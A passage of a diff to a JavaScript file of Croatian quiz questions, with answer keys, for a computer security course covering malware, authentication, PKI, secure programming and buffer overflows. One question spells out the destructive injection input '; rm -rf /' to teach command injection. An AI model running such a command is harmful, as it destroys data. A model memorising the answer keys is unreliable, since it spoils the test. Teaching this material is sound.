-    q: "NetWire-RAT.exe svakih 10 minuta kontaktira udaljeni poslužitelj i prima PowerShell skripte. Koja je najvjerojatnija klasifikacija?",
-    answers: ["Ransomware", "Alat za udaljeni pristup (RAT)", "Logička bomba", "Adware"],
-    correct: 1,
-    explanation: "RAT (Remote Access Tool/Trojan) omogućava napadaču potpunu udaljenu kontrolu nad računalom — izvršavanje naredbi, pristup datotekama, snimanje zaslona i sl."
-  },
-  {
-    topic: "Zloćudni kod",
-    q: "Koji je motiv kibernetičkih kriminalaca prema klasifikaciji izvora prijetnji?",
-    answers: ["Državni interesi i špijunaža", "Financijska zarada", "Promicanje političkih stavova", "Akademsko istraživanje"],
-    correct: 1,
-    explanation: "Kibernetički kriminalci su motivirani financijskom zaradom — krađa podataka kartica, ucjene, prodaja malwarea, bankarske prijevare."
-  },
-  {
-    topic: "Zloćudni kod",
-    q: "Što je botnet?",
-    answers: [
-      "Mreža antivirusnih skenera",
-      "Mreža zaraženih računala kojom upravlja napadač putem C&C poslužitelja",
-      "Skup alata za izradu malwarea",
-      "Protokol za sigurnu komunikaciju između uređaja"
-    ],
-    correct: 1,
-    explanation: "Botnet = mreža botova (zaraženih računala/uređaja) kojima botmaster upravlja putem C&C-a. Koristi se za DDoS napade, slanje spama ili krađu podataka."
-  },
-
-  // ── AUTENTIFIKACIJA I AUTORIZACIJA ──────────────────────────────────────────
-  {
-    topic: "Autentifikacija & Autorizacija",
-    q: "Sustav traži: korisničko ime, lozinku i OIB. Je li ovo dvofaktorska autentifikacija?",
-    answers: [
-      "Da, jer se koriste tri podatka",
-      "Ne, jer sva tri su isti faktor — 'ono što znamo'",
-      "Da, jer OIB je biometrijski podatak",
-      "Ne, jer mora biti točno dva, ne tri"
-    ],
-    correct: 1,
-    explanation: "2FA zahtijeva dva RAZLIČITA faktora (što znamo / što jesmo / što imamo). Korisničko ime, lozinka i OIB su svi 'ono što znamo' — dakle samo jedan faktor."
-  },
-  {
-    topic: "Autentifikacija & Autorizacija",
-    q: "Kojoj kategoriji faktora autentifikacije pripada biometrija (otisak prsta, prepoznavanje lica)?",
-    answers: ["Ono što znamo", "Ono što imamo", "Ono što jesmo", "Ono što radimo"],
-    correct: 2,
-    explanation: "Tri faktora: što znamo (lozinka, PIN), što imamo (token, pametna kartica), što jesmo (biometrija). Biometrija spada u 'ono što jesmo'."
-  },
-  {
-    topic: "Autentifikacija & Autorizacija",
-    q: "Zašto se lozinkama pri pohrani dodaje 'salt'?",
-    answers: [
-      "Kako bi se lozinka šifrirala",
-      "Kako bi dva korisnika s istom lozinkom imali različite hash vrijednosti u bazi",
-      "Kako bi se ubrzalo hashiranje",
-      "Kako bi se lozinka mogla dekriptirati po potrebi"
-    ],
-    correct: 1,
-    explanation: "Salt je slučajna vrijednost koja se dodaje svakoj lozinki prije hashiranja. Onemogućava napadaču da koristi unaprijed izračunate rainbow tablice i osigurava da isti passwordi daju različite hasheve."
-  },
-  {
-    topic: "Autentifikacija & Autorizacija",
-    q: "U procesu autorizacije — korisnik mirko pokušava čitati /etc/shadow. Koji je subjekt, a koji objekt?",
-    answers: [
-      "Subjekt je /etc/shadow, objekt je mirko",
-      "Subjekt je mirko, objekt je /etc/shadow",
-      "Subjekt je OS, objekt je mirko",
-      "Subjekt i objekt su oboje mirko"
-    ],
-    correct: 1,
-    explanation: "Autorizacija: subjekt = tko traži pristup (mirko), objekt = čemu se pristupa (/etc/shadow), operacija = što se radi (čitanje)."
-  },
-  {
-    topic: "Autentifikacija & Autorizacija",
-    q: "U sustavu za autorizaciju baziranom na ulogama (RBAC), kakvo je preslikavanje između korisnika i uloga?",
-    answers: ["1:1 — jedan korisnik, jedna uloga", "1:N — jedan korisnik, više uloga", "N:M — korisnik može imati više uloga, uloga može imati više korisnika", "M:1 — više korisnika dijeli jednu ulogu"],
-    correct: 2,
-    explanation: "RBAC koristi N:M preslikavanje — jedan korisnik može imati više uloga, a jedna uloga može imati više korisnika. Isto vrijedi za dozvole i uloge."
-  },
-  {
-    topic: "Autentifikacija & Autorizacija",
-    q: "U datoteci /etc/shadow user_1 i user_2 imaju identičan hash ali različit salt. Što to znači?",
-    answers: [
-      "Sigurno imaju istu lozinku",
-      "Ne mogu imati istu lozinku jer im je salt različit",
-      "Vjerojatno imaju istu lozinku — isti salt s istom lozinkom daje isti hash",
-      "Vjerojatno imaju istu lozinku — ali isti hash s ISTIM saltom potvrđuje to"
+      "Javnim ključem poslužitelja www.fer.unizg.hr",
+      "Privatnim ključem poslužitelja www.fer.unizg.hr",
+      "Javnim ključem GEANT OV RSA CA 4",
+      "Privatnim ključem GEANT OV RSA CA 4"
     ],
     correct: 3,
-    explanation: "Ako je salt isti (AAAAAAAA) i hash isti, onda su lozinke gotovo sigurno iste — isti salt + ista lozinka = isti hash. Da je salt različit, jednaki hashevi bi bili nevjerojatna slučajnost."
+    explanation: "Digitalni potpis u certifikatu uvijek stvara IZDAVAČ (CA) koristeći PRIVATNI ključ. Verifikacija se radi javnim ključem izdavača koji se nalazi u nadređenom certifikatu u lancu."
   },
-
-  // ── SIGURNO PROGRAMIRANJE ────────────────────────────────────────────────────
   {
-    topic: "Sigurno programiranje",
-    q: "Varijabla ispitProlaz inicijalizira se na true, zatim se u try bloku provjerava broj bodova. Koji princip je narušen?",
+    topic: "PKI & Certifikati",
+    q: "Certifikat poslužitelja ima polje 'X509v3 Basic Constraints: CA:FALSE'. Što to znači?",
     answers: [
-      "Princip najmanjih prava",
-      "Sigurno ispadanje (Fail Securely) — inicijalno stanje treba biti 'odbijeno'",
-      "Kerckhoffov princip",
-      "Obrana u dubinu"
+      "Certifikat je istekao i nije valjan",
+      "Certifikat ne može potpisivati (izdavati) druge certifikate — nije certifikacijski autoritet",
+      "Certifikat ne koristi CA infrastrukturu",
+      "Certifikat je samopotpisan (self-signed)"
     ],
     correct: 1,
-    explanation: "Fail Securely: inicijalno stanje mora biti sigurno (odbijeno/false). Ako kod baci iznimku, ispitProlaz ostaje true — napadač to može iskoristiti namjernim izazivanjem iznimke."
+    explanation: "CA:FALSE znači da se ovaj certifikat ne smije koristiti kao CA — ne može potpisivati nove certifikate. Samo CA certifikati imaju CA:TRUE. Ovo je kritično polje u validaciji lanca certifikata."
   },
   {
-    topic: "Sigurno programiranje",
-    q: "U Linuxu alat passwd se izvršava s root ovlastima. Koji princip to krši?",
-    answers: ["Obranu u dubinu", "Princip najmanjih prava (Least Privilege)", "Sigurno ispadanje", "Kerckhoffov princip"],
+    topic: "PKI & Certifikati",
+    q: "Napadač je rastavio RSA modulus N na proste faktore p i q. Što može izračunati?",
+    answers: [
+      "Ništa korisno — N je ionako javan",
+      "Privatni ključ d (iz φ(N) = (p-1)(q-1) i javnog e) i time dešifrirati svu komunikaciju",
+      "Samo javni ključ e",
+      "Hash vrijednost certifikata"
+    ],
     correct: 1,
-    explanation: "Princip najmanjih prava: svaki proces/korisnik treba imati samo minimalna potrebna prava. Passwd treba pisati u /etc/shadow pa mu trebaju root ovlasti, ali idealnije bi bilo koristiti setuid mehanizam s uskim opsegom."
+    explanation: "Iz p i q: φ(N)=(p-1)(q-1), a d = e^(-1) mod φ(N). Poznavanje privatnog ključa d omogućuje dešifriranje svih poruka šifriranih tim javnim ključem u RSA varijanti TLS rukovanja."
   },
   {
-    topic: "Sigurno programiranje",
-    q: "Prijedlog je koristiti tajno razvijeni hash algoritam umjesto SHA-256. Koji princip ovo krši?",
+    topic: "PKI & Certifikati",
+    q: "Ispravan lanac certifikata za www.fer.unizg.hr: USERTrust → GEANT OV RSA CA 4 → *.fer.unizg.hr. Koji certifikati moraju imati CA:TRUE?",
+    answers: [
+      "Samo *.fer.unizg.hr",
+      "Samo USERTrust root CA",
+      "USERTrust i GEANT OV RSA CA 4, ali NE *.fer.unizg.hr",
+      "Svi certifikati u lancu"
+    ],
+    correct: 2,
+    explanation: "Svi certifikati u lancu OSIM najnižeg (poslužiteljevog) moraju imati CA:TRUE jer moraju moći potpisivati niže certifikate. Poslužiteljev *.fer.unizg.hr ima CA:FALSE — nije CA."
+  },
+  {
+    topic: "PKI & Certifikati",
+    q: "Poslužitelj na www.fer.hr koristi certifikat izdan za *.fer.unizg.hr. Preglednik prijavi grešku. Zašto?",
+    answers: [
+      "Jer certifikat nije izdan od pouzdanog CA",
+      "Jer Subject (*.fer.unizg.hr) ne odgovara domeni www.fer.hr — certifikat vrijedi samo za poddomene fer.unizg.hr",
+      "Jer je certifikat istekao",
+      "Jer se isti certifikat ne smije koristiti na dva poslužitelja"
+    ],
+    correct: 1,
+    explanation: "TLS validacija: certifikat mora biti izdan za domenu kojoj pristupamo. *.fer.unizg.hr pokriva www.fer.unizg.hr ali NOT fer.hr niti www.fer.hr — to je potpuno različita domena."
+  },
+  {
+    topic: "PKI & Certifikati",
+    q: "SHA-1 koristi se za 'Subject Key Identifier' u X.509 certifikatu. Koja vrsta kriptografskog algoritma je SHA-1?",
+    answers: ["Simetrična blok šifra", "Asimetrični (javni ključ) algoritam", "Kriptografska hash funkcija", "MAC algoritam s ključem"],
+    correct: 2,
+    explanation: "SHA-1 je kriptografska hash funkcija — deterministički algoritam koji poruci proizvoljne duljine pridružuje sažetak fiksne duljine (160 bita). Napomena: SHA-1 više nije siguran za kriptografsku upotrebu."
+  },
+  {
+    topic: "PKI & Certifikati",
+    q: "Web preglednik 'Hrabri' ignorira CA:TRUE/FALSE polje. FER administratori imaju *.fer.unizg.hr certifikat. Što mogu napraviti?",
+    answers: [
+      "Mogu prisluškivati sav HTTPS promet na internetu",
+      "Mogu koristiti taj ključ kao CA i potpisati lažni certifikat za www.gmail.com koji Hrabri prihvaća",
+      "Mogu promijeniti DNS zapise za bilo koju domenu",
+      "Ništa — certifikati su vezani uz IP adrese"
+    ],
+    correct: 1,
+    explanation: "Bez CA:FALSE provjere, FER može koristiti privatni ključ iz *.fer.unizg.hr certifikata za potpisivanje novog certifikata za gmail.com. Hrabri će prihvatiti jer lančano validira samo do pouzdanog roota, ne provjerava smije li CA potpisivati."
+  },
+  {
+    topic: "PKI & Certifikati",
+    q: "U RSA varijanti TLS rukovanja, čemu služi javni ključ poslužitelja (Modulus, Exponent)?",
+    answers: [
+      "Digitalnom potpisivanju TLS handshake poruka",
+      "Provjeri digitalnog potpisa",
+      "Šifriranju pre-master secreta od strane klijenta",
+      "Dešifriranju podataka klijenta"
+    ],
+    correct: 2,
+    explanation: "U RSA varijanti TLS rukovanja: klijent generira pre-master secret i šifrira ga javnim ključem poslužitelja (Key Encipherment). Poslužitelj ga dešifrira privatnim ključem. Zbog toga Key Usage mora uključivati 'Key Encipherment'."
+  },
+  {
+    topic: "PKI & Certifikati",
+    q: "Formula za dešifriranje pre-master secreta c na poslužitelju s privatnim ključem (N, d) je:",
+    answers: ["m = c^e mod N", "m = c^d mod N", "m = H(c)^d mod N", "m = c XOR d"],
+    correct: 1,
+    explanation: "RSA dekripcija: m = c^d mod N. Klijent je šifrirao: c = m^e mod N. Poslužiteljev privatni ključ d omogućuje povrat originalnog pre-master secreta m."
+  },
+  {
+    topic: "PKI & Certifikati",
+    q: "Mirko gradi sustav s ci = mi XOR RSA(pk, iv+i) bez MAC-a. Pruža li povjerljivost?",
+    answers: [
+      "Da, RSA je siguran asimetrični algoritam",
+      "Ne — RSA(pk, iv+i) je deterministički (isti ulaz = isti keystream), ranjiv je na pattern napade poput ECB-a",
+      "Da, ali samo za kratke poruke do 256 bajta",
+      "Ne, jer iv mora biti tajan"
+    ],
+    correct: 1,
+    explanation: "RSA bez randomiziranog paddinga je deterministički. Budući da je iv+i predvidljiv, keystream je isti za svako slanje iste poruke — napadač može prepoznati obrasce. Bez MAC-a nema ni integriteta."
+  },
+
+  // ══════════════════════════════════════════════════════════════
+  // TOPIC 3 — SIGURNOST PROGRAMSKE PODRŠKE
+  // ══════════════════════════════════════════════════════════════
+  {
+    topic: "Sigurnost programske podrške",
+    q: "Varijabla ispitProlaz se inicijalizira na true, zatim se u try bloku provjeravaju bodovi. Koji princip je narušen?",
     answers: [
       "Princip najmanjih prava",
-      "Izbjegavanje sigurnosti prikrivanjem (Security Through Obscurity)",
+      "Sigurno ispadanje (Fail Securely) — inicijalno stanje mora biti sigurno/odbijeno",
+      "Kerckhoffov princip",
+      "Princip obrane u dubinu"
+    ],
+    correct: 1,
+    explanation: "Fail Securely: ako kod baci iznimku, ispitProlaz ostaje true → korisnik dobiva prava koja ne zaslužuje. Napadač može namjerno izazvati iznimku. Rješenje: inicijalizirati na false, postaviti true tek kad su sve provjere prošle."
+  },
+  {
+    topic: "Sigurnost programske podrške",
+    q: "Koji je ispravan popravak za kod koji krši Fail Securely? (ispitProlaz = true na početku, try blok provjerava bodove)",
+    answers: [
+      "Dodati else { ispitProlaz = true; } nakon if bloka",
+      "Zamijeniti ispitProlaz = true na početku s ispitProlaz = false",
+      "Ukloniti try-catch blok",
+      "Dodati finally { ispitProlaz = false; }"
+    ],
+    correct: 1,
+    explanation: "Jedino ispravno: inicijalizirati na false (sigurno stanje), a true postaviti tek kad provjera uspije. Dodavanje else nije dovoljno jer catch blok i dalje može završiti s true ako iznimka nastane PRIJE if uvjeta."
+  },
+  {
+    topic: "Sigurnost programske podrške",
+    q: "U Linuxu, alat passwd se izvršava s root ovlastima. Koji princip to krši?",
+    answers: [
+      "Obranu u dubinu",
+      "Princip najmanjih prava (Least Privilege)",
+      "Sigurno ispadanje",
+      "Kerckhoffov princip"
+    ],
+    correct: 1,
+    explanation: "Princip najmanjih prava: svaki proces/korisnik treba imati samo minimalna potrebna prava. Passwd dobiva root ovlasti samo da piše u /etc/shadow — ovo je krišenje načela jer passwd nosi više prava nego što mu je nužno za svaki korak."
+  },
+  {
+    topic: "Sigurnost programske podrške",
+    q: "Prijedlog za hashiranje lozinki: koristiti tajni, interno razvijeni algoritam čiji detalji nisu javni. Koja smjernica je narušena?",
+    answers: [
+      "Princip najmanjih prava",
+      "Izbjegavanje sigurnosti prikrivanjem (Security by obscurity) — krši Kerckhoffov princip",
       "Obranu u dubinu",
       "Minimizaciju prostora za napad"
     ],
     correct: 1,
-    explanation: "Kerckhoffov princip kaže da sigurnost ne smije ovisiti o tajnosti algoritma. Korištenje neprovjerenosti algoritma je 'security through obscurity' — loša praksa."
+    explanation: "Kerckhoffov princip: sigurnost ne smije ovisiti o tajnosti algoritma. Tajni algoritam koji nije javno provjeren vjerovatno ima ranjivosti koje nitko nije otkrio jer ga nije ni pregledao."
   },
   {
-    topic: "Sigurno programiranje",
+    topic: "Sigurnost programske podrške",
     q: "Statička analiza koda je:",
     answers: [
-      "Analiza ponašanja programa tijekom izvođenja",
-      "Automatsko pokretanje programa s nasumičnim ulazima",
-      "Analiza izvornog koda bez pokretanja programa",
-      "Analiza mrežnog prometa aplikacije"
+      "Analiza ponašanja programa tijekom izvođenja s testnim ulazima",
+      "Automatsko slanje nasumičnih ulaza programu (fuzzing)",
+      "Pregled izvornog koda bez pokretanja programa, ručno ili alatima",
+      "Analiza mrežnog prometa koji aplikacija generira"
     ],
     correct: 2,
-    explanation: "Statička analiza = pregled koda bez izvođenja (ručno ili alatima). Dinamička analiza = promatranje ponašanja programa za vrijeme izvođenja."
+    explanation: "Statička analiza = čitanje/analiza koda bez pokretanja (analiza izvornog koda). Dinamička = analiza ponašanja za vrijeme izvođenja. Fuzzing = posebna vrsta dinamičke analize s nasumičnim ulazima."
   },
   {
-    topic: "Sigurno programiranje",
-    q: "Što je TOCTOU (Time-Of-Check-Time-Of-Use) ranjivost?",
+    topic: "Sigurnost programske podrške",
+    q: "Što je TOCTOU (Time-of-Check Time-of-Use) ranjivost?",
     answers: [
-      "Napad koji eksploatira vremenski kanal",
-      "Situacija gdje se resurs promijeni između provjere uvjeta i stvarnog korištenja",
-      "Tehnika pogađanja lozinki vremenskim mjerenjem",
-      "Ranjivost u protokolima sinkronizacije vremena"
+      "Napadač mjeri vrijeme izvođenja algoritma da otkrije ključ",
+      "Resurs se promijeni između provjere uvjeta i stvarnog korištenja — napadač iskorištava taj vremenski razmak",
+      "Napad koji iskorištava sinkronizaciju TLS protokola",
+      "Vremenski napad na password mehanizam"
     ],
     correct: 1,
-    explanation: "TOCTOU (race condition): napadač može promijeniti resurs (npr. simboličku vezu) između trenutka provjere i trenutka korištenja, zaobilazeći sigurnosne provjere."
+    explanation: "TOCTOU (race condition): napadač zamijeni datoteku simboličkom vezom između provjere (je li datoteka naša?) i korištenja (čitaj datoteku). Provjera je bila ispravna, ali do korištenja situacija se promijenila."
   },
   {
-    topic: "Sigurno programiranje",
-    q: "Korisnik šalje username '; rm -rf /' umjesto svog imena. Kakav je to napad?",
+    topic: "Sigurnost programske podrške",
+    q: "Korisnik unosi '; rm -rf /' kao svoje korisničko ime. Kakav je to napad?",
     answers: ["SQL injection", "Command injection", "Buffer overflow", "XSS"],
     correct: 1,
-    explanation: "Command injection: napadač ubacuje OS naredbu umjesto podatka. Točka-zarez (;) u Linuxu označava slijedno izvođenje naredbi, pa se rm -rf / izvršava kao nastavak."
+    explanation: "Command injection: napadač ubacuje OS naredbu. Točka-zarez (;) u Linuxu = slijedno izvođenje — ls /home/; rm -rf / briše sve. Zaštita: whitelist pristup, ne koristiti shell s korisničkim unosom direktno."
   },
   {
-    topic: "Sigurno programiranje",
-    q: "JavaScript: let x = '5'; let y = x * 2; let z = x + 2; Koji su tipovi varijabli x, y, z?",
+    topic: "Sigurnost programske podrške",
+    q: "JavaScript kod: let x = '5'; let y = x * 2; let z = x + 2; Koji su tipovi x, y, z?",
     answers: [
       "string, number, string",
       "number, number, number",
@@ -648,19 +762,236 @@ const ALL_QUESTIONS = [
       "number, string, string"
     ],
     correct: 0,
-    explanation: "x = '5' je string. '5' * 2 = 10 (JS pretvara u broj za množenje) → y = number. '5' + 2 = '52' (konkatenacija jer je + s stringom) → z = string."
+    explanation: "x = '5' je string. '5' * 2 = 10 — JavaScript konvertira string u broj za množenje (number). '5' + 2 = '52' — operator + s stringom vrši konkatenaciju (string). Slabo tipiziran jezik!"
+  },
+  {
+    topic: "Sigurnost programske podrške",
+    q: "ffsshd demon radi: (1) čita hash datoteke, (2) provjerava je li u FAMILYLIST, (3) pokreće je. Koji je napad moguć s dvije paralelne sesije?",
+    answers: [
+      "SQL injection u FAMILYLIST provjeru",
+      "TOCTOU race condition: u sesiji 2 zamijeniti datoteku malicioznom verzijom između provjere hasha i poziva execv",
+      "Buffer overflow u funkciji hasha",
+      "XSS kroz ime datoteke"
+    ],
+    correct: 1,
+    explanation: "TOCTOU: sesija 1 čeka da ffsshd provjeri hash legitimne datoteke → sesija 2 odmah zamijeni tu datoteku malicioznom. ffsshd tada pokreće malicioznu datoteku jer hash bio valjan u trenutku provjere."
+  },
+  {
+    topic: "Sigurnost programske podrške",
+    q: "Kako ispraviti ffsshd TOCTOU ranjivost ako OS dopušta pokretanje samo putem execv po imenu?",
+    answers: [
+      "Provjeravati hash dva puta zaredom",
+      "Kao privilegirani proces: kopirati datoteku na sigurnu lokaciju, postaviti vlasnika root i ovlasti 500, provjeriti hash kopije, pokrenut kopiju",
+      "Blokirati sve paralelne sesije korisnika",
+      "Koristiti SHA-512 umjesto SHA-256"
+    ],
+    correct: 1,
+    explanation: "Rješenje: kopirati u sigurnu lokaciju (napadač nema pristup), promijeniti vlasnika na root i ovlasti 500 (samo root može pisati), provjeriti hash kopije, pokrenuti kopiju. Napadač ne može zamijeniti kopiju jer nema ovlasti pisanja."
+  },
+  {
+    topic: "Sigurnost programske podrške",
+    q: "Heartbleed ranjivost u OpenSSL-u je primjer koje vrste propusta?",
+    answers: [
+      "Buffer overflow na stogu (stack overflow)",
+      "Nedostatna provjera ispravnosti ulaza — server vraća više memorije nego što je legitimno zatraženo",
+      "SQL injection u OpenSSL bazi certifikata",
+      "Race condition u TLS handshakeu"
+    ],
+    correct: 1,
+    explanation: "Heartbleed: klijent kaže 'vrati mi riječ BIRD od 500 slova'. Server ne provjerava stvarnu duljinu (4 slova), vraća 500 bajta iz memorije — uključujući privatne ključeve, session tokene i lozinke."
+  },
+  {
+    topic: "Sigurnost programske podrške",
+    q: "Zašto je whitelist pristup validaciji ulaza sigurniji od blacklist pristupa?",
+    answers: [
+      "Jer je whitelist brži za obradu",
+      "Jer blacklist treba zabraniti sve moguće varijante malicioznih unosa — a isti znakovi se mogu kodirati na bezbroj načina",
+      "Jer whitelist koristi manje memorije",
+      "Jer blacklist ne funkcionira u web aplikacijama"
+    ],
+    correct: 1,
+    explanation: "Blacklist: zabranjuješ poznate loše unose — ali 'localhost' se može pisati kao 127.0.0.1, ::1, 0x7f000001, itd. Whitelist: dozvoljavaš samo točno određene ispravne unose — sve ostalo je zabranjeno. Puno sigurniji."
+  },
+  {
+    topic: "Sigurnost programske podrške",
+    q: "Strogo tipizirani jezik provjerava tipove pri kompilaciji. Za x=3; y='SRS'; z=x+y — što se dogodi?",
+    answers: [
+      "Greška tijekom izvođenja (runtime error) — program se pokrene ali crashira",
+      "Greška prilikom prevođenja (compile error) — program se uopće ne može pokrenuti",
+      "Uspješno prevođenje — z će biti '3SRS'",
+      "Uspješno prevođenje — z će biti 3"
+    ],
+    correct: 1,
+    explanation: "Strogo tipiziran + statička provjera (Java, C++): neskladnost tipova (int + string) se otkriva u fazi prevođenja → program ne može ni startati. Strogo tipiziran + dinamička provjera (Python): TypeError pri izvođenju. Slabo tipiziran (JavaScript): tiha konverzija ('3' + 'SRS' = '3SRS')."
+  },
+  {
+    topic: "Sigurnost programske podrške",
+    q: "Princip obrane u dubinu (Defense in Depth) kaže:",
+    answers: [
+      "Jedan jak sigurnosni mehanizam je dovoljan ako je dovoljno jak",
+      "Uvijek treba biti više neovisnih slojeva zaštite — zaobilaženjem jednog ne smiju se trivijalno zaobići ostali",
+      "Sigurnosni mehanizmi moraju biti što složeniji",
+      "Obrana se temelji na prikrivanju arhitekture sustava"
+    ],
+    correct: 1,
+    explanation: "Defense in Depth: više neovisnih slojeva zaštite. Ako napadač zaobiđe jedan sloj, nailazi na sljedeći. Mehanizmi moraju biti neovisni — savladavanjem jednog ne smiju se automatski savladati svi."
   },
 
-  // ── LINUX OVLASTI ───────────────────────────────────────────────────────────
+  // ══════════════════════════════════════════════════════════════
+  // TOPIC 3 — BUFFER OVERFLOW (dio sigurnosti programske podrške)
+  // ══════════════════════════════════════════════════════════════
   {
-    topic: "Linux ovlasti",
-    q: "Datoteka ima ovlasti: -rw-r--r-- Može li korisnik koji nije vlasnik niti u grupi pisati u datoteku?",
-    answers: ["Da, svi mogu pisati", "Ne, ostali (others) imaju samo pravo čitanja", "Da, grupa može pisati", "Nije moguće odrediti"],
+    topic: "Buffer overflow",
+    q: "U kojoj smjeru raste funkcijski stog (stack) na tipičnom x86-64 Linux sustavu?",
+    answers: ["Prema višim memorijskim adresama", "Prema nižim memorijskim adresama", "Nasumično — ovisi o OS-u", "Horizontalno — ne raste u smjeru adresa"],
     correct: 1,
-    explanation: "rw-r--r--: vlasnik može čitati i pisati (rw-), grupa može samo čitati (r--), ostali mogu samo čitati (r--). Nitko osim vlasnika nema pravo pisanja."
+    explanation: "Stog raste prema NIŽIM adresama. Gomila (heap) raste prema višim adresama. Ovo je ključno za razumijevanje buffer overflow napada — prepisivanjem varijabli 'prema gore' doseže se adresa za povratak."
   },
   {
-    topic: "Linux ovlasti",
+    topic: "Buffer overflow",
+    q: "Kod koji deklarira varijable: char admin_password[16]; char entered_password[16]; — koja je na nižoj adresi na stogu?",
+    answers: [
+      "admin_password (deklarirana prva)",
+      "entered_password (deklarirana druga — kasnije deklarirane varijable su na nižim adresama)",
+      "Obje su na istoj adresi",
+      "Ovisi o kompajleru"
+    ],
+    correct: 1,
+    explanation: "Stog raste prema nižim adresama, a lokalne varijable se alociraju na stogu redom deklaracije. Dakle: entered_password (deklarirana POSLIJE) = niža adresa. scanf upisuje u entered_password i može preliti prema višim adresama (prema admin_password, rbp, return address)."
+  },
+  {
+    topic: "Buffer overflow",
+    q: "Što su NOP sanjke (NOP sled) i zašto ih napadač koristi?",
+    answers: [
+      "Niz no-operation instrukcija (0x90) ispred shellcode-a — povećava šansu pogotka jer svaki NOP 'sklizne' do shellcode-a",
+      "Niz lažnih adresa za povratak koji zbunjuje antivirusne programe",
+      "Tehnika šifriranja shellcode-a",
+      "Niz instrukacija za zaobilaženje kanarinca"
+    ],
+    correct: 0,
+    explanation: "NOP (0x90) = ne radi ništa, samo pomiče na sljedeću instrukciju. Veliki NOP sled ispred shellcode-a znači: ako pogodimo BILO KOJI NOP, izvođenje 'sklizne' do shellcode-a. Rješava problem pogađanja točne adrese."
+  },
+  {
+    topic: "Buffer overflow",
+    q: "Što sprečava Write-XOR-Execute (W^X) zaštita?",
+    answers: [
+      "Sprečava napadača da promijeni adresu za povratak",
+      "Sprečava izvođenje ubačenog koda — memorija može biti ili zapisiva ili izvršiva, ali ne oboje istovremeno",
+      "Sprečava prepisivanje kanarinca",
+      "Sprečava učitavanje vanjskih biblioteka"
+    ],
+    correct: 1,
+    explanation: "W^X: svaka memorijska stranica može biti writeable ILI executable, ne oboje. Napadač može upisati shellcode na stog (writable), ali ga ne može izvesti jer stog nije executable. Sprečava klasične shellcode napade."
+  },
+  {
+    topic: "Buffer overflow",
+    q: "Zašto W^X zaštita NE sprečava ROP (Return Oriented Programming) napade?",
+    answers: [
+      "Jer ROP ne upisuje ništa novo — koristi samo već postojeći izvršivi kod u memoriji programa",
+      "Jer W^X ne funkcionira na 64-bitnim sustavima",
+      "Jer ROP šifrira gadgete pa W^X ih ne prepoznaje",
+      "Jer W^X štiti samo heap, ne i stog"
+    ],
+    correct: 0,
+    explanation: "ROP gadgeti su kratki nizovi legitimnih instrukcija koji VEĆ POSTOJE u izvršivim dijelovima programa ili biblioteka. Napadač ih ne upisuje — samo mijenja adrese na stogu da lančano poziva gadgete. W^X ne pomaže jer se ne izvodi ništa novo."
+  },
+  {
+    topic: "Buffer overflow",
+    q: "Što su ROP gadgeti?",
+    answers: [
+      "Shellcode koji napadač ubacuje na stog",
+      "Kratki nizovi legitimnih strojnih instrukcija u memoriji programa koji završavaju s 'ret' — napadač ih lančano spaja",
+      "Posebne instrukcije za zaobilaženje kanarinca",
+      "Alati za automatsko generiranje exploita"
+    ],
+    correct: 1,
+    explanation: "Gadget: kratki niz instrukcija završen s 'ret' koji već postoji u programu/bibliotekama. Napadač prepisuje stog nizom adresa gadgeta + parametara. Ret na kraju svakog gadgeta skače na sljedeći gadget — lančanje bez ubacivanja novog koda."
+  },
+  {
+    topic: "Buffer overflow",
+    q: "Kako funkcioniraju kanarinci (stack canaries)?",
+    answers: [
+      "Lažne povratne adrese koje preusmjeravaju napadača na bezopasni kod",
+      "Nasumična vrijednost smještena između lokalnih varijabli i adrese povratka — provjerava se pri izlasku iz funkcije",
+      "Zaštitni mehanizam koji randomizira adrese funkcija",
+      "Hash vrijednosti svih lokalnih varijabli"
+    ],
+    correct: 1,
+    explanation: "Kanarinac: nasumična vrijednost na stogu između varijabli i adrese povratka. Preloader je sprema. Pred povratkom iz funkcije, provjerava se je li kanarinac nepromijenjen. Napadač ne može prepisati adresu povratka bez da prepiše i kanarinca — a ne može ga pogoditi."
+  },
+  {
+    topic: "Buffer overflow",
+    q: "Kako možemo zaključiti da program ne koristi kanarince?",
+    answers: [
+      "Program je napisan u Pythonu",
+      "Prepisivanje stoga s garbage vrijednostima ne uzrokuje prijevremeni crash s 'stack smashing detected' — program se sruši tek pri skoku na nevažeću adresu",
+      "Program koristi statičke varijable",
+      "Program ima W^X zaštitu"
+    ],
+    correct: 1,
+    explanation: "S kanarincem: prepisivanje uzrokuje 'stack smashing detected' PRIJE povratka iz funkcije. Bez kanarinca: program se srušava tek kad pokuša skočiti na nevažeću return address. Ako programa opstaje do skoka — nema kanarinca."
+  },
+  {
+    topic: "Buffer overflow",
+    q: "Što je ASLR (Address Space Layout Randomization)?",
+    answers: [
+      "Tehnika šifriranja stoga pri svakom pokretanju",
+      "Slučajno raspoređivanje adresa stoga, heap-a i biblioteka pri svakom pokretanju — napadač ne zna gdje su funkcije",
+      "Automatsko postavljanje kanarinca na stog",
+      "Randomizacija redosljeda lokalnih varijabli"
+    ],
+    correct: 1,
+    explanation: "ASLR: adrese stoga, heapa i biblioteka mijenjaju se pri svakom pokretanju. Napadač ne može hardkodirati adresu shellcode-a ni libc funkcija (npr. system()). Na 32-bit sustavima entropija je premala, na 64-bit je učinkovitija."
+  },
+  {
+    topic: "Buffer overflow",
+    q: "Funkcija scanf(\"%s\", entered_password) je ranjiva. Zašto?",
+    answers: [
+      "Jer scanf ne podržava Unicode znakove",
+      "Jer %s čita string bez provjere veličine odredišnog buffera — upisuje dok ne nađe whitespace, može prepisati memoriju iza buffera",
+      "Jer scanf ne može čitati lozinke sigurno",
+      "Jer %s formatira ulaz pogrešno na 64-bitnim sustavima"
+    ],
+    correct: 1,
+    explanation: "scanf(\"%s\", buf) nema ograničenje duljine — čita dok ne dođe do whitespace/EOF. Napadač upiše više od reserviranog prostora i prepisuje stog: ostatak lokalnih varijabli, stari rbp, adresu za povratak."
+  },
+  {
+    topic: "Buffer overflow",
+    q: "Napadač ima seq[index] = value bez provjere granica. Kako eksploatira za promjenu adrese povratka?",
+    answers: [
+      "Upiše value=0 da poništi adresu povratka",
+      "Koristi preveliki pozitivni index da piše izvan seq[] niza, na višim adresama gdje se nalazi adresa za povratak na stogu",
+      "Upiše velik value da prepiše sve lokalne varijable",
+      "Koristi index=0 jer je to uvijek adresa povratka"
+    ],
+    correct: 1,
